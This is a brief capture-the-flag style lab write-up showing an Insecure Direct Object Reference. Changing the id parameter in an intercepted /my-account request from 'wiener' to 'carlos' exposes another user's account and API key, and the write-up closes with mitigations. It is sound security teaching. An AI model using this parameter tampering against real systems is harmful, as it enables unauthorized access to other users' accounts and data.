## Lab Name
User ID controlled by request parameter

## Vulnerability
Access Control Vulnerability – Insecure Direct Object Reference (IDOR)

## Objective
Access another user’s account (administrator) by modifying the user ID parameter.

## Entry Point
User account page URL parameter (id)

## Exploitation Type
Parameter Tampering / IDOR

## Methodology
1. Login with provided user credentials
2. Navigate to My Account page

   Example:
   /my-account?id=wiener

3. Intercept request in Burp Suite

   GET /my-account?id=wiener HTTP/1.1

4. Modify user ID parameter

   GET /my-account?id=carlos HTTP/1.1

5. Forward the request

6. Carlos account details are displayed
7. Copy the API ki of carlos and then submit as solution

## Payload Used

Original:
id=wiener

Modified:
id=carlos

## Result
Successfully accessed the carlos account by modifying the user ID parameter. Then Copy the API of carlos user and submit as solution.

## Impact
- Unauthorized access to other user accounts
- Exposure of sensitive information
- Possible account takeover

## Mitigation
- Implement proper server-side authorization checks
- Do not trust user input for access control
- Use session-based access instead of direct object references
- Apply role-based access control (RBAC)

## Learning
User-controlled parameters like IDs should never be trusted for authorization decisions.
Always validate access permissions on the server side.
